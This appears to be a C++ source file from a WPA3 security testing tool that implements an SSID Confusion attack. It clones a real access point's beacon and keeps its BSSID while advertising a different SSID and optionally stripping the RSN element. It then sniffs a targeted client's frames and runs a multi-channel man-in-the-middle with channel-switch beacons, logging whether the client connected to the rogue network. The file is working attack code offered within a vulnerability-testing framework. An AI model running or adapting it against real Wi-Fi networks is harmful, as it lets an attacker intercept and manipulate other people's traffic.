#include "attacks/mc_mitm/ssid_confusion_attack.h"

#include <thread>
#include <chrono>
#include <tins/tins.h>

#include "attacks/by_target/scan_AP.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "config/RunStatus.h"
#include "logger/log.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::ssid_confusion {
    
    static unique_ptr<Dot11Beacon> make_confused_beacon(
        const Dot11Beacon& real,
        const string& confused_ssid,
        const bool strip_rsn)
    {
        auto b = make_unique<Dot11Beacon>();
        b->addr1(real.addr1());   // broadcast
        b->addr2(real.addr2());   // BSSID (kept identical to real AP — key to the attack)
        b->addr3(real.addr3());
        b->timestamp(real.timestamp());
        b->interval(real.interval());
        b->capabilities() = real.capabilities();

        for (const auto& opt : real.options()) {
            if (opt.option() == IEEE_TLV_TYPE_SSID) {
                // Advertise a different SSID than the real AP
                b->add_option(Dot11::option(
                    IEEE_TLV_TYPE_SSID,
                    confused_ssid.size(),
                    reinterpret_cast<const uint8_t*>(confused_ssid.data())));
            } else if (strip_rsn && opt.option() == IEEE_TLV_TYPE_RSN) {
                // Drop RSN IE — rogue AP appears as an open network
            } else {
                b->add_option(opt);
            }
        }
        return b;
    }

    void run_attack(RunStatus& rs) {
        const auto att_real  = rs.get_actor("att_real_channel");
        const auto att_rogue = rs.get_actor("att_rogue_channel");
        const auto ap        = rs.get_actor("access_point");
        const auto client       = rs.get_actor("client");

        const auto& att_cfg    = rs.config.at("attack_config");
        const string real_ssid    = ap["ssid"];
        const string confused_ssid = att_cfg.value("confused_ssid", real_ssid);
        const bool   strip_rsn    = att_cfg.value("strip_rsn", false);
        const int    timeout      = att_cfg.value("attack_time_sec", 30);

        McMitm attack(att_real["iface"], att_rogue["iface"], real_ssid, client["mac"]);
        attack.setup_ifaces(att_real, client["mac"], att_rogue, ap["mac"]);
        rs.start_observers();

        attack.sender_real  = make_unique<PacketSender>(att_real["sniff_iface"]);
        attack.sender_rogue = make_unique<PacketSender>(att_rogue["sniff_iface"]);

        // Sniff only frames involving the real AP or the targeted client
        string bpf = "(wlan addr1 "+ap["mac"]+") or (wlan addr2 "+ap["mac"]+")"
            " or (wlan addr1 "+client["mac"]+") or (wlan addr2 "+client["mac"]+")";
        bpf = "(wlan type data or wlan type mgt) and ("+bpf+")";

        SnifferConfiguration cfg_real, cfg_rogue;
        cfg_real.set_filter(bpf);
        cfg_rogue.set_filter(bpf);
        cfg_real.set_immediate_mode(true);
        cfg_rogue.set_immediate_mode(true);

        attack.sniffer_real  = make_unique<Sniffer>(att_real["sniff_iface"],  cfg_real);
        attack.sniffer_rogue = make_unique<Sniffer>(att_rogue["sniff_iface"], cfg_rogue);

        // Scan for real AP beacon to clone its IEs (RSN, HT caps, …)
        attack_scan::ScanAP scan_ap{};
        scan_ap.bssid = ap["mac"];
        attack.beacon = RSN_scan(att_real["iface"], 10, scan_ap);
        if (!attack.beacon)
            throw runtime_error("SSID Confusion: beacon of real AP not found");

        // Build the rogue beacon with the confused SSID (and optionally no RSN)
        const auto confused_beacon = make_confused_beacon(*attack.beacon, confused_ssid, strip_rsn);

        log(LogLevel::INFO, "SSID Confusion setup: real='"+real_ssid+"' rogue='"+confused_ssid+"'");

        log(LogLevel::INFO, "Rogue AP started, waiting 1 s to initialize ...");
        this_thread::sleep_for(seconds(1));

        attack.netconfig.real_channel  = stoi(ap["channel"]);
        attack.netconfig.rogue_channel = stoi(att_rogue["channel"]);
        attack.netconfig.ssid = real_ssid;
        attack.ap_mac         = ap["mac"];
        attack.client_mac     = client["mac"];

        // McMitm::run() sends CSA beacons continuously throughout its loop
        attack.run(timeout);

        bool vulnerable = false;
        for (const auto& [mac, client_entry] : attack.clients) {
            if (client_entry->state >= ClientState::GotMitm) {
                vulnerable = true;
                log(LogLevel::INFO,
                    "RESULT VULNERABLE: client "+mac+" accepted rogue SSID '"+confused_ssid+
                    "' while configured for '"+real_ssid+"'");
            }
        }
        if (!vulnerable)
            log(LogLevel::INFO, "RESULT NOT_VULNERABLE: no client connected to rogue SSID '"+confused_ssid+"'");
    }
}